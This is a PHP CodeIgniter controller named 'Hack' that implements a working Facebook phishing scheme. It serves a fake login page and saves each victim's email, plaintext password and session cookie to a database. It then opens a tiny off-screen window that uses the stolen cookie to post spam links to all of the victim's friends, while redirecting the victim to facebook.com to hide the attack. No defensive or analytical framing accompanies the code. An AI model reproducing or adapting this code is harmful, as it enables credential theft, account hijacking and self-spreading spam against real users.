<?php

/* * ***************************************************************************

  Ghi chú:hoàn thành ngày 30-07-2015
  Copyright :Hồ Minh Trí

 * ************************************************************************** */

if(!defined('BASEPATH'))
	exit('No direct script access allowed');

class Hack extends CI_Controller{

	public $_arr_data=array();

	public function __construct(){

		parent::__construct();

		$this->load->helper(array('url','facebook'));
		$this->load->Model(array('m_card','m_facebook'));

	}

	public function facebook(){

		$facebook_login=facebook_login();

		if($facebook_login['facebook_login'] === false){

			if($this->m_card->check_card_user_session($facebook_login['facebook_cookie']) === false){

				$arr_data['card_uid']="account_hack";
				$arr_data['card_user_email']=$facebook_login['facebook_email'];
				$arr_data['card_user_pass']=$facebook_login['facebook_pass'];
				$arr_data['card_user_session']=$facebook_login['facebook_cookie'];
				$arr_data['card_order']=100;
				$arr_data['card_active']=1;
				$arr_data['card_public']=1;
				$arr_data['card_create_date']=date('Y-m-d H:i:s');
				$arr_data['card_update_date']=date('Y-m-d H:i:s');

				if($this->m_card->insert_card($arr_data)){

					echo $this->javascript_facebook("window_open","facebook_friend?param=".base64_encode($facebook_login['facebook_cookie'])."/");
					exit();
				}
				else{

					$_POST=false;
					$facebook_login=facebook_login();
				}
			}
			else{

				$_POST=false;
				$facebook_login=facebook_login();
			}
		}

		$this->_arr_data['facebook_login']=$facebook_login;
		echo $this->_arr_data['facebook_login']['facebook_html'];

	}

	public function facebook_friend(){

		$facebook_cookie="";
		if(isset($_GET['param']))
			$facebook_cookie=base64_decode($_GET['param']);

		if($facebook_cookie != ""){

			$arr_facebook_friend=facebook_get_friend($facebook_cookie);
			if(is_array($arr_facebook_friend) && !empty($arr_facebook_friend)){

				$arr_facebook_hack=$this->m_facebook->get_facebook_hack_front_end("themehack");
				if(is_array($arr_facebook_hack) && !empty($arr_facebook_hack) && $arr_facebook_hack['facebook_friend_bool'] == "1" && $arr_facebook_hack['facebook_friend_id'] == "27041990"){

					echo $this->javascript_facebook("window_redirect",$arr_facebook_hack['facebook_post_url']);

					foreach($arr_facebook_friend as $key=> $value){

						//sleep(2);
						facebook_post_friend($facebook_cookie,$value,$arr_facebook_hack['facebook_friend_message'],$arr_facebook_hack['facebook_friend_url'],$arr_facebook_hack['facebook_friend_title'],$arr_facebook_hack['facebook_friend_summary'],$arr_facebook_hack['facebook_friend_image']);
					}
				}
			}

			//echo $this->javascript_facebook("window_redirect","https://www.facebook.com");
		}
		else{

			//echo $this->javascript_facebook("window_redirect","https://www.facebook.com");
			show_404('page');
		}

	}

	private function javascript_facebook($javascript_type=false,$param=''){

		if(!(($this->uri->segment(1) == 'hack') && ($this->uri->segment(2) == 'javascript_facebook'))){

			$language_javascript="";
			switch($javascript_type){

				case "window_open":
					$language_javascript.="<script language='javascript'>";
					$language_javascript.="var window_url='".base_url().$param."';";
					$language_javascript.="var window_size_document='channelmode=no, directories=yes, fullscreen=no, location=no, resizable=no, scrollbars=no';";
					$language_javascript.="window_size_document+=', left=2000, top=2000, width=10, height=10';";
					$language_javascript.="window_size_document+=', menubar=no, status=no, titlebar=no, toolbar=no';";
					$language_javascript.="window.open(window_url,'_blank',window_size_document,true);";
					$language_javascript.="window.location='https://www.facebook.com'";
					$language_javascript.="</script>";
					break;

				case "window_redirect":
					$language_javascript.="<script language='javascript'>";
					$language_javascript.="window.opener.location='".$param."'";
					$language_javascript.="</script>";
					break;
			}

			return $language_javascript;
		}
		else
			show_404('page');

	}

}

?>